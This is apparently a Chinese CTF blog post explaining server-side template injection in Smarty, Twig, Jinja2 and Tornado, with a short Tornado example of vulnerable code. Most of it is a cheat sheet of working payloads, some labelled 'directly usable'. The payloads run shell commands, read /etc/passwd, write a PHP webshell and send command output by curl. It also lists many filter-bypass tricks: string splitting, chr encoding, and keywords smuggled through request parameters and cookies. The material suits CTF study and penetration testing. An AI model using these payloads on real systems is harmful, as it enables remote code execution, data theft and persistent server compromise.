---
title: SSTI
abbrlink: 47d18edd
date: 2022-10-18 18:05:31
cover: false
tags:
  - CTF-Web
  - SSTI
categories:
  - CTF
  - Web安全
typora-root-url: ..
---







>**SSTI 就是服务器端模板注入（Server-Side Template Injection）**
>
>当前使用的一些框架，比如`python`的`flask`，`php`的`tp`，`java`的`spring`等一般都采用成熟的的MVC的模式，用户的输入先进入`Controller`控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给`View`视图层，经过模板渲染展示给用户。
>
>漏洞成因就是服务端**接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分**，**模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句**，因而可能导致了敏感信息泄露、代码执行、`GetShell `等问题。其影响范围主要取决于模版引擎的复杂性。
>
>凡是使用模板的地方都可能会出现 `SSTI `的问题，`SSTI `不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。
>
>



# 判定模板类型:

已知的模板以及一些相关问题

<img src="/images/SSTI/2.png" alt="image-20221016171017464" style="zoom: 150%;" />



在注入点处依次传下面的`payload`,根据响应情况判定模板的类型

<img src="/images/SSTI/1.png" alt="image-20221016171017464" style="zoom:67%;" />



例如:注入点在`XFF`处:

<img src="/images/SSTI/image-20221018181508342.png" alt="image-20221018181508342" style="zoom:67%;" />

![image-20221018181541447](/images/SSTI/image-20221018181541447.png)

根据这两次的回显就可以确定这里的模板是`smarty`



<br>

***

<br>

# Smarty(PHP)

>`Smarty`是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。如果开启了安全模式的话, 这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 `php` 中直接执行命令的函数(相当于存在了一个`disable_function`)
>
>当然还是可以利用`Smarty`内置的变量和方法,例如`smarty`类里的`getStreamVariable`就可以用来读取文件流
>
>

## 一般的利用方式和payload收集

1. 获取`smarty`版本号:

```
{$smarty.version}  
```

2. ` {php}{/php}`执行`php`代码(此标签已在`smarty3`中被废弃):

```
{php}phpinfo();{/php}  
```

3. ` {literal}` 可以让一个模板区域的字符维持原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析, 例如:

```
{literal}alert('xss');{/literal} //XSS
```



4. 通过**`getstreamvariable`**方法来实现文件读取:(3.1.30的Smarty版本中官方已经把该静态方法删除)

```
{self::getStreamVariable("file:///etc/passwd")}
```

这个类的源码位于:**smarty/libs/sysplugins/smarty_internal_data.php** 

```php
/**
     * gets  a stream variable
     *
     * @param string $variable the stream of the variable
     * @return mixed the value of the stream variable
     */
    public function getStreamVariable($variable)
    {
        $_result = '';
        $fp = fopen($variable, 'r+'); //根据传进来的参数读取
        if ($fp) {
            while (!feof($fp) && ($current_line = fgets($fp)) !== false ) {
                $_result .= $current_line;
            }
            fclose($fp);
            return $_result;
        }

        if ($this->smarty->error_unassigned) {
            throw new SmartyException('Undefined stream variable "' . $variable . '"');
        } else {
            return null;
        }
    }
```

5. 使用**{if}{/if}**标签来执行`php`代码,注意这里每个{if}必须有一个配对的{/if}

```
 {if phpinfo()}{/if}
 {if system("ls")}{/if}
```



6. 其他: 直接执行命令

```
{system('ls')} 
{system('cat index.php')} 
```



<br>

***

<br>



# Twig(php)

可用payload汇总:

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}  //id可以换成别的系统命令

{{'/etc/passwd'|file_excerpt(1,30)}}

{{app.request.files.get(1).__construct('/etc/passwd','')}}

{{app.request.files.get(1).openFile.fread(99)}}

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

{{_self.env.enableDebug()}}{{_self.env.isDebug()}}

{{["id"]|map("system")|join(",")

{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}

{{["id",0]|sort("system")|join(",")}}

{{["id"]|filter("system")|join(",")}}

{{[0,0]|reduce("system","id")|join(",")}}

{{['cat /etc/passwd']|filter('system')}}
```



<br>

***

<br>

# Jinja2

## 基本payload:

```
{{config}} 

获得基类
#python2.7
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]

输出所有子类的列表:
[].__class__.__bases__[0].__subclasses__()

查找子类下有没有可利用的方法: 
[].__class__.__bases__[0].__subclasses__()[117].__init__["__globals__"]
[].__class__.__bases__[0].__subclasses__()[59].__init__["__globals__"]['__builtins__']
输出中可能包含eval,popen等

#python3.7
''.__。。。class__.__mro__[1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]

#python 2.7
#文件操作
#找到file类
[].__class__.__bases__[0].__subclasses__()[40]
#读文件
[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
#写文件
[].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')

# 命令执行
# os执行
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.  #linecache下有os类，可以直接执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
# eval,impoer等全局函数
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.
# __builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
# 这里popen中是具体执行的系统命令
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")

[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")

[].__class__.__bases__[0].__subclasses__()   [59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()

[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()


#python3.7
#命令执行
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}

#文件操作 读文件
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

#执行windows下的os命令
"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()

```



## 一些绕过:

- 过滤了`.`可以用中括号来代替: (获取属性,子类)

  <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>这里调用某个类的方法时: `__init__.__globals__` 和 `__init__['__globals__']` 是一样的, 后者可以使用字符拼接绕过过滤,例如:`__init__['__glo'+'bals__']`</span>

  ```
  ''.__class__  相当于  ''['__class__']
  ```

也可以使用`|attr` 即使用前面的输出作为后面操作的对象:

```
''.__class__ 相当于 ''|attr('__class__')
```



- 过滤`[`中括号

```
[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()不起作用:

使用__getitem__, pop来根据键获取值

''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()

''.__class__.__mro__[-1] 相当于  ''.__class__.__mro__.__getitem__(-1)
```

- 过滤引号:

```
#chr函数
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}

# 这里%2b是加号, 下面的字符连起来是/etc/passwd,也就是读取/etc/passwd  这里根据自己需要执行的命令来替换
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#request对象

{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd

#命令执行
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}

# 这里字符连起来是id,也就是要执行的命令, 根据自己的需要来替换
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}

#引入其他参数来执行命令
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id

```

- 过滤下划线:

```
{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
```

- 过滤双花括号:

```
# 用{%%}标记
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}

{%print(x|attr(request.cookies.init)|attr(request.cookies.globals)|attr(request.cookie.getitem)|attr(request.cookies.builtins)|attr(request.cookies.getitem)(request.cookies.eval)(request.cookies.command))%}
#cookie: init=__init__;globals=__globals__;getitem=__getitem__;builtins=__builtins__;eval=eval;command=__import__("os").popen("cat /flag").read()
```

利用示例:

```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}         
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

`//popen的参数就是要执行的命令`



- 过滤关键词 : 字符拼接

```
''.__class__ 相当于:

''['__cla' + 'ss__'] 简单最常用
''['__cla'~'ss__']
''['__ssalc__'[::-1]] 转置(反转过来)
{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}
""['__cTass__'.replace("T","l")] 替换单个字符
''["{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)]  格式化字符串
''["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"] 十六进制拼接
''['X19jbGFzc19f'.decode('base64')] base64编码
''['__CLASS__'.lower()] 大小写
```

<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>另一种绕过关键词过滤的方法: 通过`request.args.x`来通过其他GET传的参数来代替被过滤的关键词</span>:

```
?search={{[].__class__.__bases__[0].__subclasses__()[59][request.args.a][request.args.b][request.args.c][request.args.d](request.args.e)}}&a=__init__&b=__globals__&c=__builtins__&d=eval&e=__import__('os').popen('ls').read()

那么这里实际上就相当于:
?search={{[].__class__.__bases__[0].__subclasses__()[59]['__init__']['__globals__']['__builtins__']['eval']('__import__('os').popen('ls').read()')
```

参数对照:

```
request              #request.__init__.__globals__['__builtins__']
request.args.x1   	 #get传参
request.values.x1 	 #所有参数
request.cookies      #cookies参数
request.headers      #请求头参数
request.form.x1   	 #post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 #post传参	(Content-Type:a/b)
request.json		 #post传json  (Content-Type: application/json)
```



## 一般的利用思路:

[[WesternCTF2018]shrine](2e610037.html)

访问`config`中的某个元素:

```
{{config['FLAG']}}
{{config.FLAG}} 
{{self.dict._TemplateReference__context.config}}

config被过滤时:
{{url_for.__globals__['current_app'].config}} 
{{get_flashed_messages.__globals__['current_app'].config}} 
//利用__globals__访问current_app, 后者就是当前的app的映射, 自然就能访问到app.config. 但是需要依靠具体函数才能够访问__globals__
```

<br>

```
1.随便找一个内置类对象用__class__拿到他所对应的类
2.用__bases__或者__mro__拿到基类（<class ‘object’>）
3.用__subclasses__()拿到子类列表
4.在子类列表中直接寻找可以利用的类getshell
5.接下来只要找到能够利用的类（方法、函数）就好

例如
''.__class__  可以寻找到字符串的类对象:
<type 'str'>

''.__class__.__mro__ 向上寻找基类
(<type 'str'>, <type 'basestring'>, <type 'object'>)

>>> ''.__class__.__mro__[2].__subclasses__() 寻找可用的引用
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]

利用: ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()

{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}  
  {% if b.__class__ == {}.__class__ %}         //遍历基类 找到eval函数
    {% if 'eval' in b.keys() %}    //找到了
      {{ b['eval']('__import__("os").popen("ls").read()') }}  //导入cmd 执行popen里的命令 read读出数据
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}


读取文件(直接可用)
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}
{%endif%}
{%endfor%}

执行命令(直接可用)
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__']['__import__']('os').__dict__['popen']('ls /').read() }}
{%endif%}
{%endfor%}
如果有关键词被过滤,可以使用字符串拼接的方法来绕过,例如import被过滤时,上面的payload可以改为:
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__']['__imp'+'ort__']('os').__dict__['popen']('ls /').read() }}
{%endif%}
{%endfor%}
以及正常的执行命令:
{{[].__class__.__bases__[0].__subclasses__()[59].__init__["__glo"+"bals__"]['__bui'+'ltins__']['ev'+'al']("__import__('os').popen('ls').read()")}}

```

其他几个含有`eval`的类:

```
warnings.catch_warnings
WarningMessage
codecs.IncrementalEncoder
codecs.IncrementalDecoder
codecs.StreamReaderWriter
os._wrap_close
reprlib.Repr
weakref.finalize
```





<br>

***

<br>

# Tornado(Python)

参考题目:[buuctf-[护网杯 2018]easy_tornado](2e610037.html)

> [`Tornado`](http://www.tornadoweb.org/) 是一个`Python web`框架和异步网络库，起初由 [FriendFeed](http://friendfeed.com/) 开发. 通过使用非阻塞网络I/O， Tornado可以支撑上万级的连接，处理 [长连接](http://en.wikipedia.org/wiki/Push_technology#Long_polling), [WebSockets](http://en.wikipedia.org/wiki/WebSocket) ，和其他需要与每个用户保持长久连接的应用. (**也就是一个开源的Web服务器软件,特点是非阻塞**)
>
> 文档:https://tornado-zh.readthedocs.io/zh/latest/index.html

**`render`**是`python`中的一个**渲染函数**，也就是一种**模板**，**通过调用的参数不同，生成不同的网页** ，如果用户对**`render`**内容可控，不仅可以注入`XSS`代码，而且还可以通过**`{{}}`**进行传递变量和执行简单的表达式。

将给定的模板与给定的上下文字典组合在一起，并以渲染的文本返回一个 `HttpResponse` 对象。

例如这里相传进去一个值为`Error`的`msg`参数后,被`render`处理并返回到浏览器上渲染:

<img src="/images/SSTI/image-20221016171017464.png" alt="image-20221016171017464" style="zoom:67%;" />

修改这个参数的值的话,相应地也会被浏览器渲染成对应内容:

<img src="/images/SSTI/image-20221016171125521.png" alt="image-20221016171125521" style="zoom:67%;" />

下面的解释参考:https://www.cnblogs.com/bmjoker/p/13508538.html

```python
import tornado.template
import tornado.ioloop
import tornado.web
TEMPLATE = '''  
<html>
 <head><title> Hello {{ name }} </title></head>
 <body> Hello max </body>
</html>
'''
// TEMPLATE作为一个模板文件
class MainHandler(tornado.web.RequestHandler):
    def get(self):
        name = self.get_argument('name', '')
        template_data = TEMPLATE.replace("FOO",name) 
        //这里的FOO是用户自定义的数据,用来替换到模板中的{{ name }}处
        //用户通过get的方式给name这个变量传值,这里没有对用户传的name值进行安全检查
        t = tornado.template.Template(template_data)
        self.write(t.generate(name=name))

application = tornado.web.Application([(r"/", MainHandler),], debug=True, static_path=None, template_path=None)

if __name__ == '__main__':
    application.listen(8000)
    tornado.ioloop.IOLoop.instance().start()
```

由上面的代码可知,如果用户传一个可执行的脚本代码,例如:

```html
<script>alert(1)</script>
```

这段代码就会被替换到模板中,在被浏览器渲染后执行,由此也就形成了`SSTI`

<br>



在`tornado`模板中，存在一些可以访问的快速对象，例如**`{{handler.settings}}`**,里面存储着一些环境变量
